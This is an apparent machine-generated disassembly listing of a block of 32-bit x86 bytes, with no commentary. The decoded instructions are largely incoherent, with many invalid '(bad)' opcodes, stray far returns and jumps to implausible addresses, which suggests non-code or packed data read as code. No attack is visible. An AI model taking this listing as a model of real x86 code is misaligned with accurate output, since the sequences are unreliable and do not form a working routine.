  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
